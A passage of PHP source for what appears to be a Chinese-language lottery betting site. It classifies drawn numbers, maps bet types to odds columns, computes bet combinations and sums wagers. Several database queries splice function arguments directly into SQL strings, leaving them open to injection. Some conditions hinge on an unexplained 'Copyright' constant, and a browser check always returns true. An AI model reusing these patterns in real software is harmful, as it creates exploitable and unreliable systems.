				$type = '1-5神奇快乐';
			else if ($ball == '红' || $ball == '蓝' || $ball == '绿')
				$type = '1-5红蓝绿';
		}
	}
	else if ($t == "總和、龍虎")
	{
		if ($ball == '總和大' || $ball == '總和小')
			$type = '總和大小';
		else if ($ball == '總和單' || $ball == '總和雙')
			$type = '總和單雙';
		else if ($ball == '總和尾大' || $ball == '總和尾小')
			$type = '總和尾數大小';
		else if ($ball == '龍' || $ball == '虎')
			$type = '龍虎';
	}
	else if ($t == '一中一' || $t == '選二連直' || $t == '二中二' || $t == '三中二' || $t == '選三前直' || $t == '三中三' || $t == '四中三' || $t == '五中三')
		$type = $t;
	return $type;
}
function _getStringcq ($t, $ball='')
{
	$ball=trim($ball);
	if ($t == "第一球" || $t == "第二球" || $t == "第三球" || $t == "第四球" || $t == "第五球")
	{
		if ($ball == '大' || $ball == '小')
			$type = '1-5大小';
		elseif ($ball == '單' || $ball == '雙')
			$type = '1-5單雙';
		else
			$type = $t;
	}
	else if ($t == "總和、龍虎和")
	{
		if ($ball == '總和大' || $ball == '總和小')
			$type = '總和大小';
		else if ($ball == '總和單' || $ball == '總和雙')
			$type = '總和單雙';
		else if ($ball == '龍' || $ball == '虎' || $ball == '和')
			$type = '龍虎和';
	}
	else if ($t == '前三' || $t == '中三' || $t == '后三')
		$type = $t;
	return $type;
}
function _getStringsz ($t, $ball='')
{
	if($t=='圍骰') 
		$t='圍骰全骰';
	elseif($t=="三军")
	{
		if(trim($ball)=='大' || trim($ball)=='小')
			$t='大小';	
	}
	return $t;
}
function _getStringkl8 ($t, $ball=NULL)
{
	return $t;
}
/**
 * 获取当天开奖号码 g_ball_1 is not null
 * Enter description here ...
 * @param unknown_type $parameter
 */
function history_result ($parameter)
{
	$db = new DB();
	$startDate = date('Y-m-d').' 00:00';
	$endDate = date('Y-m-d').' 24:00';
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$sql = "SELECT g_ball_1, g_ball_2, g_ball_3, g_ball_4, g_ball_5, g_ball_6, g_ball_7, g_ball_8 FROM `g_history` WHERE $date AND g_game_id =1 AND g_ball_1 is not null ORDER BY g_qishu asc ";
	return $db->query($sql, $parameter);
}

/**
 * 計算總分
 * Enter description here ...
 * @param int 類型
 * @param int 總分
 * @param int 0、1 標示符
 */
function SubBall ($num, $ball, $p=0)
{
	switch ($num)
	{
		case 0 : //總和大小
			if ($ball == 84)
				return $p==0 ? '<font color="seagreen">和</font>' : '和';
			else if ($ball <= 83)
				return $p==0 ? '小' : '小';
			else
				return $p==0 ? '<font color="red">大</font>' : '大';
		case 1 : //總和單雙
			if ($ball % 2 == 0)
				return $p==0 ? '<font color="red">雙</font>' : '雙';
			else 
				return $p==0 ? '單' : '單';
		case 2 : //總和尾數大小
			if ($ball >=5)
				return $p==0 ? '<font color="red">尾大</font>' : '尾大';
			else
				return $p==0 ? '尾小' : '尾小';
		case 3 : //龍虎
			if ($ball[0] > $ball[1])
				return $p==0 ? '<font color="red">龍</font>' : '龍';
			else
				return $p==0 ? '<font color="black">虎</font>' : '虎';
	}
}

/**
 * 號碼轉換字符串。
 * Enter description here ...
 * @param unknown_type $t //遊戲玩法
 * @param unknown_type $n //號碼
 */
function GetBallByString ($t, $n)
{
	if ($t == "總和、龍虎")
	{
		switch ($n) 
		{
			case 1: $n = '總和大'; break;
			case 2: $n = '總和單'; break;
			case 3: $n = '總和小'; break;
			case 4: $n = '總和雙'; break;
			case 5: $n = '總和尾大'; break;
			case 6: $n = '龍'; break;
			case 7: $n = '總和尾小'; break;
			case 8: $n = '虎'; break;
		}
	}
	if ($t == "第一球" || $t == "第二球" || $t == "第三球" || $t == "第四球" || $t == "第五球" || $t == "第六球" || $t == "第七球" || $t == "第八球")
	{
		if (mb_strlen($n) <=1) 
			$n = '0'.$n;
		else
		{
			switch ($n) 
			{
				/*case 21: $n = '大'; break;
				case 22: $n = '單'; break;
				case 23: $n = '尾大'; break;
				case 24: $n = '合數單'; break;
				case 25: $n = '小'; break;
				case 26: $n = '雙'; break;
				case 27: $n = '尾小'; break;
				case 28: $n = '合數雙'; break;
				case 29: $n = '東'; break;
				case 30: $n = '南'; break;
				case 31: $n = '西'; break;
				case 32: $n = '北'; break;
				case 33: $n = '中'; break;
				case 34: $n = '發'; break;
				case 35: $n = '白'; break;*/
				case 21 : $n = '大'; break;
				case 22 : $n = '小'; break;
				case 23 : $n = '單'; break;
				case 24 : $n = '雙'; break;
				case 25 : $n = '尾大'; break;
				case 26 : $n = '尾小'; break;
				case 27 : $n = '合數單'; break;
				case 28 : $n = '合數雙'; break;
				case 29: $n = '東'; break;
				case 30: $n = '南'; break;
				case 31: $n = '西'; break;
				case 32: $n = '北'; break;
				case 33: $n = '中'; break;
				case 34: $n = '發'; break;
				case 35: $n = '白'; break;
			}
		}
	}
	return $n;
}
function GetBallByString_gx ($t, $n)
{
	if ($t == "總和、龍虎")
	{
		switch ($n) 
		{
			case 1: $n = '總和大'; break;
			case 2: $n = '總和單'; break;
			case 3: $n = '總和小'; break;
			case 4: $n = '總和雙'; break;
			case 5: $n = '總和尾大'; break;
			case 6: $n = '龍'; break;
			case 7: $n = '總和尾小'; break;
			case 8: $n = '虎'; break;
		}
	}
	if ($t == "第一球" || $t == "第二球" || $t == "第三球" || $t == "第四球" || $t == "特码" || $t == "第六球" || $t == "第七球" || $t == "第八球")
	{
		if (mb_strlen($n) <=1){ 
			
			$n = '0'.$n;
		}
		else
		{
			switch ($n) 
			{
				/*case 21: $n = '大'; break;
				case 22: $n = '單'; break;
				case 23: $n = '尾大'; break;
				case 24: $n = '合數單'; break;
				case 25: $n = '小'; break;
				case 26: $n = '雙'; break;
				case 27: $n = '尾小'; break;
				case 28: $n = '合數雙'; break;
				case 29: $n = '東'; break;
				case 30: $n = '南'; break;
				case 31: $n = '西'; break;
				case 32: $n = '北'; break;
				case 33: $n = '中'; break;
				case 34: $n = '發'; break;
				case 35: $n = '白'; break;*/
				case 21 : $n = '大'; break;
				case 22 : $n = '小'; break;
				case 23 : $n = '單'; break;
				case 24 : $n = '雙'; break;
				case 25 : $n = '尾大'; break;
				case 26 : $n = '尾小'; break;
				case 27 : $n = '合數單'; break;
				case 28 : $n = '合數雙'; break;
				case 29: $n = '神'; break;
				case 30: $n = '奇'; break;
				case 31: $n = '快'; break;
				case 32: $n = '乐'; break;
				case 33: $n = '红'; break;
				case 34: $n = '蓝'; break;
				case 35: $n = '绿'; break;
			}
		if($n==221) $n=21;
		}
	}
	return $n;
}
function GetWeekDay($date, $p) {

    $dateArr = explode(" ", $date);
    $dateArr = explode("-", $dateArr[0]);
    $wday = date("w", mktime(0,0,0,$dateArr[1],$dateArr[2],$dateArr[0]));
	switch ($wday)
    {
        case 0 : return $p == 0 ? '日' : '星期日';
        case 1 : return $p == 0 ? '一' : '星期一';
        case 2 : return $p == 0 ? '二' : '星期二';
        case 3 : return $p == 0 ? '三' : '星期三';
        case 4 : return $p == 0 ? '四' : '星期四';
        case 5 : return $p == 0 ? '五' : '星期五';
        case 6 : return $p == 0 ? '六' : '星期六';
    }

} 

/**
 * 瀏覽器檢測、只支持IE核心
 */
function GetMsie ()
{
	$browser = FALSE;
	if(strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 8.0')) 
		$browser = TRUE;
	else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 7.0'))
		$browser = TRUE;
	else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 6.0'))
		$browser = TRUE;
	return true;
}

function week ()
{
	$weekend = date('Y-m-d',strtotime('last sunday'));  //monday
	//上周一至周日算法
	for ($n=7; $n>0; $n--)
		$week['weekstart'][] = date("Y-m-d", mktime(0, 0, 0,date("m",strtotime($weekend)),date("d",strtotime($weekend))+1-$n,date("Y",strtotime($weekend))));
	
	//本周一至周日算法
	for ($i=0; $i<7; $i++)
		$week['weekend'][] = date("Y-m-d", mktime(0, 0, 0,date("m",strtotime($weekend)),date("d",strtotime($weekend))+1+$i,date("Y",strtotime($weekend))));
	return $week;
}

/**
 * 讀取賠率
 * Enter description here ...
 * @param String $s_type //玩法類型
 * @param String $select //查詢條件
 * @return odds
 */
function GetOdds ($s_type, $select,$gameid)
{
	$where = null;
	if($gameid==1) $gameid='';
	switch ($s_type)
	{
		case '第一球' : $where = "Ball_1"; break;
		case '第二球' : $where = "Ball_2"; break;
		case '第三球' : $where = "Ball_3"; break;
		case '第四球' : $where = "Ball_4"; break;
		case '第五球' : $where = "Ball_5"; break;
		case '第六球' : $where = "Ball_6"; break;
		case '第七球' : $where = "Ball_7"; break;
		case '第八球' : $where = "Ball_8"; break;
		case '總和、龍虎' : $where = "Ball_9"; break;
		case '連碼' : $where = "Ball_10"; break;
		case '任選二' : $where = "Ball_10"; $select='h1'; break;
		case '選二連組' : $where = "Ball_10"; $select='h3'; break;
		case '任選三' : $where = "Ball_10"; $select='h4'; break;
		case '選三前組' : $where = "Ball_10"; $select='h6'; break;
		case '任選四' : $where = "Ball_10"; $select='h7'; break;
		case '任選五' : $where = "Ball_10"; $select='h8'; break;
	}
	switch ($select)
	{
		case '01' : $select = 'h1'; break;
		case '02' : $select = 'h2'; break;
		case '03' : $select = 'h3'; break;
		case '04' : $select = 'h4'; break;
		case '05' : $select = 'h5'; break;
		case '06' : $select = 'h6'; break;
		case '07' : $select = 'h7'; break;
		case '08' : $select = 'h8'; break;
		case '09' : $select = 'h9'; break;
		case '10' : $select = 'h10'; break;
		case '11' : $select = 'h11'; break;
		case '12' : $select = 'h12'; break;
		case '13' : $select = 'h13'; break;
		case '14' : $select = 'h14'; break;
		case '15' : $select = 'h15'; break;
		case '16' : $select = 'h16'; break;
		case '17' : $select = 'h17'; break;
		case '18' : $select = 'h18'; break;
		case '19' : $select = 'h19'; break;
		case '20' : $select = 'h20'; break;
		case '大' : $select = 'h21'; break;
		case '小' : $select = 'h22'; break;
		case '單' : $select = 'h23'; break;
		case '雙' : $select = 'h24'; break;
		case '尾大' : $select = 'h25'; break;
		case '尾小' : $select = 'h26'; break;
		case '合數單' : $select = 'h27'; break;
		case '合數雙' : $select = 'h28'; break;
		case '東' : $select = 'h29'; break;
		case '南' : $select = 'h30'; break;
		case '西' : $select = 'h31'; break;
		case '北' : $select = 'h32'; break;
		case '中' : $select = 'h33'; break;
		case '發' : $select = 'h34'; break;
		case '白' : $select = 'h35'; break;
		case '總和大' : $select = 'h1'; break;
		case '總和小' : $select = 'h3'; break;
		case '總和單' : $select = 'h2'; break;
		case '總和雙' : $select = 'h4'; break;
		case '總和尾大' : $select = 'h5'; break;
		case '總和尾小' : $select = 'h7'; break;
		case '龍' : $select = 'h6'; break;
		case '虎' : $select = 'h8'; break;
	}
	$db = new DB();
	$sql = "SELECT {$select} FROM `g_odds{$gameid}` WHERE `g_type` = '{$where}' LIMIT 1 ";
	//echo $sql;
	$result = $db->query($sql, 1);
	return $result[0][$select];
}

function GetOddscq ($s_type, $select, $gameid=2)
{
	$db = new DB();
	$sql = "SELECT `{$select}` FROM `g_odds{$gameid}` WHERE `g_type` = '{$s_type}' LIMIT 1 ";
	$result = $db->query($sql, 0);
	return $result[0][0];
}
function GetOddsk5 ($s_type, $select)
{
	$db = new DB();
	$sql = "SELECT `{$select}` FROM `g_odds3` WHERE `g_type` = '{$s_type}' LIMIT 1 ";
	$result = $db->query($sql, 0);
	return $result[0][0];
}

function getOddsSz($s_type,$select){
	$db=new DB();
	$sql = "SELECT `{$select}` FROM `g_odds7` WHERE `g_type` = '{$s_type}' LIMIT 1 ";
	$result = $db->query($sql, 0);
	return $result[0][0];
}
function getOddsKl8($s_type,$select){
	$db=new DB();
	$sql = "SELECT `{$select}` FROM `g_odds8` WHERE `g_type` = '{$s_type}' LIMIT 1 ";
	$result = $db->query($sql, 0);
	return $result[0][0];
}
/**
 * 循環賠率
 * Enter description here ...
 * @param $index //循環索引，最大值35
 * @param $Ball //查詢條件
 */
function selectOdds ($index=1, $Ball)
{
	$select = array();
	for ($i=1; $i<=$index; $i++)
	{
		array_push($select, "`h{$i}`,");
	}
	$select = mb_substr(join($select, ''), 0,-1);
	$db = new DB();
	return $db->query("SELECT {$select} FROM `g_odds` WHERE g_type =  '{$Ball}' LIMIT 1 ", 1);
}
function selectOddsnc ($index=1, $Ball)
{
	$select = array();
	for ($i=1; $i<=$index; $i++)
	{
		array_push($select, "`h{$i}`,");
	}
	$select = mb_substr(join($select, ''), 0,-1);
	$db = new DB();
	return $db->query("SELECT {$select} FROM `g_odds9` WHERE g_type =  '{$Ball}' LIMIT 1 ", 1);
}
/**
 * 復式計算
 * Enter description here ...
 * @param Array $strArr 數組
 * @param int 循環
 * @return Array
 */
function subArr ($strArr, $count) 
{
	$len = 0; //總組數
	$Number = array();
	for ($a=0; $a<count($strArr); $a++)
	{
		if ($count == 1)
		{
			$len++;
			array_push($Number, ',');
			continue;
		}
		$_a = $a+1;
		for ($b=$_a; $b<count($strArr); $b++)
		{
			if ($count == 2)
			{
				$len++;
				array_push($Number, $strArr[$a].','.$strArr[$b]);
				continue;
			}
			$_b = $b+1;
			for ($c=$_b; $c<count($strArr); $c++)
			{
				if ($count == 3)
				{
					$len++;
					array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c]);
					continue;
				}
				$_c = $c+1;
				for ($d=$_c; $d<count($strArr); $d++)
				{
					if ($count == 4)
					{
						$len++;
						array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d]);
						continue;
					}
					$_d = $d+1;
					for ($e=$_d; $e<count($strArr); $e++)
					{
						if ($count == 5)
						{
							$len++;
							array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d].','.$strArr[$e]);
							continue;
						}
					}//5層嵌套
				}//4層嵌套
			}//3層嵌套
		}//2層嵌套
	} //1層嵌套
	$result = array($len, $Number, count($strArr));
	return $result;
}

function subArr_gx ($strArr, $count) 
{

	$len = 0; //總組數
	$Number = array();
	for ($a=0; $a<count($strArr); $a++)
	{
		if ($count == 1)
		{
			$len++;
			array_push($Number, $strArr[$a]);
			continue;
		}
		$_a = $a+1;
		for ($b=$_a; $b<count($strArr); $b++)
		{
			if ($count == 2)
			{
				$len++;
				array_push($Number, $strArr[$a].','.$strArr[$b]);
				continue;
			}
			$_b = $b+1;
			for ($c=$_b; $c<count($strArr); $c++)
			{
				if ($count == 3)
				{
					$len++;
					array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c]);
					continue;
				}
				$_c = $c+1;
				for ($d=$_c; $d<count($strArr); $d++)
				{
					if ($count == 4)
					{
						$len++;
						array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d]);
						continue;
					}
					$_d = $d+1;
					for ($e=$_d; $e<count($strArr); $e++)
					{
						if ($count == 5)
						{
							$len++;
							array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d].','.$strArr[$e]);
							continue;
						}
					}//5層嵌套
				}//4層嵌套
			}//3層嵌套
		}//2層嵌套
	} //1層嵌套
	$result = array($len, $Number, count($strArr));
	return $result;
}

function get_ball_str ($str)
{
	if ($str == 'k1')
		return 9;
	else 
		return trim(strtr($str, "g"," "));
}

/**
 * 第N球 大小 單雙 尾數大小 合數單雙 方位 中發白
 * Enter description here ...
 * @param unknown_type $result
 * @param unknown_type $index
 * @param unknown_type $int
 */
function sum_str_s ($result, $index, $int=25, $bool=FALSE, $num=NULL, $count=NULL, $p=1)
{
	$k =null;
	$ball = null;
	$stratTd = '<td class="z_cl">';
	$topTd = '</td>,<td class="z_cl">';
	$td = array();
	$ar = array();
	for ($i=0; $i<count($result); $i++)
	{
		$ball = @$result[$i][$index];
		if ($bool && Copyright) //龍虎
		{
			$ar[0] = $result[$i][0];
			$ar[1] = $result[$i][7];
			$ball = sum_ball_str_a($ar, 0, $p);
		}
		else if ($num)
		{
			$ball = sum_ball_string($ball, $num, $p);
		}
		else if ($count)
		{
			$v = $result[$i][0]+$result[$i][1]+$result[$i][2]+$result[$i][3]+$result[$i][4]+$result[$i][5]+$result[$i][6]+$result[$i][7];
			$ball = sum_ball_str_a($v, $count, $p);
		}
		if ($k != $ball){
			$str .= $i == 0 ?  $stratTd.$ball : $topTd.$ball;	
			}
		else 
			$str .= '<br />'.$ball;
		$k = $ball;
	}
	$str .= '</td>';
	$arr = explode(',', $str);
	for ($i=0; $i<25; $i++)
	{
		$td[] ='<td class="z_cl"></td>';
	}

	$arr = array_merge($td,$arr);
	$arr = array_slice($arr, -25);
	return $arr;
}
/**
 * 返回總分
 * Enter description here ...
 * @param unknown_type $result
 * @param unknown_type $index
 */
function sum_int ($result, $index)
{
	if ($index>=2 && $index<=7)
	{
		$num = $result[0]+$result[1]+$result[2]+$result[3]+$result[4]+$result[5]+$result[6]+$result[7];
	}
	else if ($index==0 || $index==1)
	{
		$num = array(0=>0, 1=>0);
		$num[0] = $result[0];
		$num[1] = $result[7];
	}
	else 
	{
		$num = null;
	}
	return $num;
}

function sum_int_gx ($result, $index)
{
	if ($index>=2 && $index<=7)
	{
		$num = $result[0]+$result[1]+$result[2]+$result[3]+$result[4];
	}
	else if ($index==0 || $index==1)
	{
		$num = array(0=>0, 1=>0);
		$num[0] = $result[0];
		$num[1] = $result[4];
	}
	else 
	{
		$num = null;
	}
	return $num;
}

/**
 * 雙面 方位 總發白 轉換函數
 * Enter description here ...
 * @param int $ball 號碼
 * @param int $index 索引
 * @param int $p 參數  $p=1 返回長字符串、$p=0 返回短字符串  例如：總分大
 */
function sum_ball_string ($ball, $index, $p=1)
{
	$number = $ball;
	if ($index==0 || $index==1) //計算單雙
	{
		if ($number%2 == 0) 
			return '雙';
		else 
			return '單';
	}
	else if ($index==2 || $index==3) //計算大小
	{
		if ($number<=10) 
			return '小';
		else 
			return '大';
	}
	else if ($index==4 || $index==5) //計算尾數大小
	{
		$i = mb_strlen($number);
		if ($i > 1)
			$number=substr($number, -1);
		if ($number >=5)
			return $p == 1 ? '尾大' : '大';
		else
			return $p == 1 ? '尾小' : '小';
	}
	else if ($index==6 || $index==7) //計算合數單雙
	{
		if ($number == 1 || $number == 3 || $number == 5 || $number == 7 || $number == 9 || $number == 10 || $number == 12 || $number == 14 || $number == 16 || $number == 18)
			return $p == 1 ? '合數單' : '單';
		else
			return $p == 1 ? '合數雙' : '雙';
	}
	else if ($index == 8) //計算方位
	{
		if ($number == 1 || $number == 5 || $number == 9 || $number == 13 || $number == 17)
			return '東';
		else if ($number == 2 || $number == 6 || $number == 10 || $number == 14 || $number == 18)
			return '南';
		else if ($number == 3 || $number == 7 || $number == 11 || $number == 15 || $number == 19)
			return '西';
		else
			return '北';
	}
	else if ($index == 9) //計算中發白
	{
		if ($number == 1 || $number == 2 || $number == 3 || $number == 4 || $number == 5 || $number == 6 || $number == 7)
			return '中';
		else if ($number == 8 || $number == 9 || $number == 10 || $number == 11 || $number == 12 || $number == 13 || $number == 14)
			return '發';
		else
			return '白';
	}
}

/**
 * 龍虎與總分轉換函數
 * 龍虎計算傳入的應當是數組
 * Enter description here ...
 * @param int $ball 號碼
 * @param int $index 索引
 * @param int $p 參數  $p=1 返回長字符串、$p=0 返回短字符串  例如：總分大
 */
function sum_ball_str_a ($ball, $index, $p=1)
{
	if ($index==0 || $index==1) //計算龍虎
	{
		if ($ball[0] > $ball[1])
			return '龍';
		else
			return '虎';
	}
	else if ($index==2 || $index==3) //計算總和大小
	{
		if ($ball == 84)
			return '和';
		else if ($ball >=85 && Copyright)
			return $p == 1 ? '總和大' : '大';
		else
			return $p == 1 ? '總和小' : '小';
	}
	else if ($index==4 || $index==5) //計算總和單雙
	{
		if ($ball % 2 == 0) 
			return $p == 1 ? '總和雙' : '雙';
		else 
			return $p == 1 ? '總和單' : '單';
	}
	else if ($index==6 || $index==7) //計算總和尾大小
	{
		$ball=substr($ball, -1);
		if ($ball >=5)
			return $p == 1 ? '總和尾大' : '大';
		else
			return $p == 1 ? '總和尾小' : '小';
	}
}

function sum_ball_string_gx ($ball, $index, $p=1)
{
          $db=new DB();
          $ConfigModel1 = $db->query("SELECT `g_gxdh`  FROM `g_config` LIMIT 1", 1);
          $ConfigModel1 = $ConfigModel1[0];
	      $number = $ball;
	if ($index==0 || $index==1) //計算單雙
	{
		if($number==21){
		if($ConfigModel1['g_gxdh']==1){
		return '豹';
		}else{
		return '和';
		}
		}else{
		if ($number%2 == 0) 
			return '雙';
		else 
			return '單';
		}
	}
	else if ($index==2 || $index==3) //計算大小
	{
		if($number==21){
		if($ConfigModel1['g_gxdh']==1){
		return '豹';
		}else{
		return '和';
		}
		}else{
		if ($number<=10) 
			return '小';
		else 
			return '大';
		}
	}
	else if ($index==4 || $index==5) //計算尾數大小
	{
		if($number==21){
		if($ConfigModel1['g_gxdh']==1){
		return '豹';
		}else{
		return '和';
		}
		}else{
		$i = mb_strlen($number);
		if ($i > 1)
			$number=substr($number, -1);
		if ($number >=5)
			return $p == 1 ? '尾大' : '大';
		else
			return $p == 1 ? '尾小' : '小';
		}	
	}
	else if ($index==6 || $index==7) //計算合數單雙
	{
		if($number==21){
		if($ConfigModel1['g_gxdh']==1){
		return '豹';
		}else{
		return '和';
		}
		}else{
		if ($number == 1 || $number == 3 || $number == 5 || $number == 7 || $number == 9 || $number == 10 || $number == 12 || $number == 14 || $number == 16 || $number == 18)
			return $p == 1 ? '合數單' : '單';
		else
			return $p == 1 ? '合數雙' : '雙';
		}	
	}
	else if ($index == 8) //計算神奇快乐
	{
		if($number==21){
		if($ConfigModel1['g_gxdh']==1){
		return '豹';
		}else{
		return '和';
		}
		}else{
		if ($number == 1 || $number == 2 || $number == 3 || $number == 4 || $number == 5)
			return '神';
		else if ($number == 6 || $number == 7 || $number == 8 || $number == 9 || $number == 10)
			return '奇';
		else if ($number == 11 || $number == 12 || $number == 13 || $number == 14 || $number == 15)
			return '快';
		else
			return '乐';
		}	
	}
	else if ($index == 9) //計算波色
	{
		if ($number == 1 || $number == 4 || $number == 7 || $number == 10 || $number == 13 || $number == 16 || $number == 19)
			return '红';
		else if ($number == 2 || $number == 5 || $number == 8 || $number == 11 || $number == 14 || $number == 17 || $number == 20)
			return '蓝';
		else
			return '绿';
	}
}

function sum_ball_str_a_gx ($ball, $index, $p=1)
{

	if ($index==0 || $index==1) //計算龍虎
	{		
		if ($ball[0] > $ball[1])
			return '龍';
		else
			return '虎';
	}
	else if ($index==2 || $index==3) //計算總和大小
	{
		if ($ball == 55)
			return '和';
		else if ($ball >=56 && Copyright)
			return $p == 1 ? '總和大' : '大';
		else
			return $p == 1 ? '總和小' : '小';
	}
	else if ($index==4 || $index==5) //計算總和單雙
	{
	        if ($ball == 55)
			return '和';
		else if ($ball % 2 == 0) 
			return $p == 1 ? '總和雙' : '雙';
		else 
			return $p == 1 ? '總和單' : '單';
	}
	else if ($index==6 || $index==7) //計算總和尾大小
	{
	        if ($ball == 55)
			return '和';
		$ball1=substr($ball, -1);
		if ($ball1 >=5)
			return $p == 1 ? '總和尾大' : '大';
		else
			return $p == 1 ? '總和尾小' : '小';
	}
}


/**
 * 出球率統計
 * 無出期數統計
 * Enter description here ...
 * @param unknown_type $result
 * @param unknown_type $gid
 */
function sum_ball_count ($result, $gid)
{
	$count = array(0=>0, 1=>0);
	$ballArr = array();
	$gid--;
	for ($i=1; $i<21; $i++)
	{
		for ($n=0; $n<count($result); $n++)
		{
			//出球率統計
			if ($i == @$result[$n][$gid])
				$count[0]++;
			//無出期數統計
			if ($i != $result[$n][0] && $i != $result[$n][1] && $i != $result[$n][2] && $i != $result[$n][3] && $i != $result[$n][4] && $i != $result[$n][5] && $i != $result[$n][6] && $i != $result[$n][7])
				$count[1]++;
			else
				$count[1] = 0;
		}
		$ballArr['row_1'][$i] = $count[0];
		$ballArr['row_2'][$i] = $count[1];
		$count[0] = 0;
		$count[1] = 0;
	}
	return $ballArr;
}


/**
 * 返回1個號碼的1個雙面值
 * Enter description here ...
 * @return Array
 */
function _getBallString ($resultArray, $BallArray, $index=0, $bool=FALSE)
{
	$countArray = array();
	for ($i=0; $i<count($BallArray); $i++)
	{
		if ($bool == FALSE && Copyright)
		{
			$numStrng = sum_ball_string($resultArray, $i);
			if ($numStrng == $BallArray[$i])
				$countArray['第'.$index.'球-'.$BallArray[$i]] = 1;
			else
				$countArray['第'.$index.'球-'.$BallArray[$i]] = 0;
		}
		else 
		{
			$nString = sum_ball_str_a(sum_int($resultArray, $i), $i);
			if ($nString == $BallArray[$i])
				$countArray[$BallArray[$i]] = 1;
			else
				$countArray[$BallArray[$i]] = 0;
		}
	}
	return $countArray;
}

/**
 * 計算雙面
 * Enter description here ...
 * @param unknown_type $BallString
 * @param unknown_type $BallString_a
 * @param unknown_type $result
 * @param unknown_type $sMax
 */
function sum_ball_count_1 ($BallString, $BallString_a, $result, $sMax=3)
{
	$numArray1 = array();
	$numArray2 = array();
	$countArray1 = array();
	$countArray2 = array();
	for ($i=0; $i<count($result); $i++) //循環期數
	{
		for ($n=0; $n<count($result[$i]); $n++) //循環8個號碼
		{
			$s = $n+1;
			$countArray1 += _getBallString($result[$i][$n], $BallString, $s);
		}
		$countArray2 += _getBallString($result[$i], $BallString_a, 0, true);
		//1-8球雙面
		foreach ($countArray1 as $key=>$value)
		{
			if ($value != 0)
				@$numArray1[$key] += $value;
			else 
				$numArray1[$key] = 0;
		}
		$countArray1 = array();
		//總分雙面、龍虎
		foreach ($countArray2 as $key=>$value)
		{
			if ($value != 0)
				@$numArray2[$key] += $value;
			else 
				$numArray2[$key] = 0;
		}
		$countArray2 = array();
	}
	$numArray1 = array_merge($numArray1, $numArray2);
	$numArr = array();
	$count = 0;
	foreach ($numArray1 as $key=>$value)
	{
		//if ($count >=20)
			//break;
		if ($value >=$sMax && Copyright)
		{
			$count++;
			$numArr[$key] = $value;
		}
	}
	return $numArr;
}
function sum_ball_count_1_nc ($BallString, $BallString_a, $result, $sMax=3)
{
	$numArray1 = array();
	$numArray2 = array();
	$countArray1 = array();
	$countArray2 = array();
	for ($i=0; $i<count($result); $i++) //循環期數
	{
		for ($n=0; $n<count($result[$i]); $n++) //循環8個號碼
		{
			$s = $n+1;
			$countArray1 += _getBallString_nc($result[$i][$n], $BallString, $s);
		}
		$countArray2 += _getBallString_nc($result[$i], $BallString_a, 0, true);
		//1-8球雙面
		foreach ($countArray1 as $key=>$value)
		{
			if ($value != 0)
				@$numArray1[$key] += $value;
			else 
				$numArray1[$key] = 0;
		}
		$countArray1 = array();
		
		//總分雙面、龍虎
		foreach ($countArray2 as $key=>$value)
		{
			if ($value != 0)
				@$numArray2[$key] += $value;
			else 
				$numArray2[$key] = 0;
		}
		$countArray2 = array();
	}
	$numArray1 = array_merge($numArray1, $numArray2);
	$numArr = array();
	$count = 0;
	foreach ($numArray1 as $key=>$value)
	{
		//if ($count >=20)
			//break;
		if ($value >=$sMax && Copyright)
		{
			$count++;
			$numArr[$key] = $value;
		}
	}
	return $numArr;
}


function GetUser_s_nc ($result, $user,$types,$ball, $p=false)
{
	//if(is_numeric($ball))
	//$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	if($ball!=null)
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = $p == true ? "g_kaipan9" : "g_kaipan9";
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['HuiYuan_XianH'] = $user[0]['g_xianhong']; //單號限額

	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}


function subArr_nc ($strArr, $count) 
{

	$len = 0; //總組數
	$Number = array();
	for ($a=0; $a<count($strArr); $a++)
	{
		if ($count == 1)
		{
			$len++;
			array_push($Number, $strArr[$a]);
			continue;
		}
		$_a = $a+1;
		for ($b=$_a; $b<count($strArr); $b++)
		{
			if ($count == 2)
			{
				$len++;
				array_push($Number, $strArr[$a].','.$strArr[$b]);
				continue;
			}
			$_b = $b+1;
			for ($c=$_b; $c<count($strArr); $c++)
			{
				if ($count == 3)
				{
					$len++;
					array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c]);
					continue;
				}
				$_c = $c+1;
				for ($d=$_c; $d<count($strArr); $d++)
				{
					if ($count == 4)
					{
						$len++;
						array_push($Number, $strArr[$a].','.$strArr[$b].','.$strArr[$c].','.$strArr[$d]);
						continue;
					}
					$_d = $d+1;
					for ($e=$_d; $e<count($strArr); $e++)
